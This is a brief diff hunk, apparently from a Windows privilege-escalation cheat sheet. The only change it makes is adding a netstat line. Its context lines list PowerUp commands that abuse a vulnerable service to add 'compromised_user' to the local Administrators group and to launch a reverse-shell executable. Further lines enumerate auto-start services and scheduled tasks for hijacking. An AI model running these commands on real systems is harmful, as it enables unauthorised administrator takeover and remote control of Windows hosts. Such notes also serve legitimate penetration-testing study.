@@ -88,7 +88,7 @@ Import-Module .\pu.ps1
 Invoke-AllChecks
 Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Administrators compromised_user /add"
 Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"
-
+netstat -ano
 wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
 schtasks /query /fo LIST /v | findstr /i /c:"TaskName:" /c:"Task To Run:"
 schtasks /run /tn "path\to\taskname"
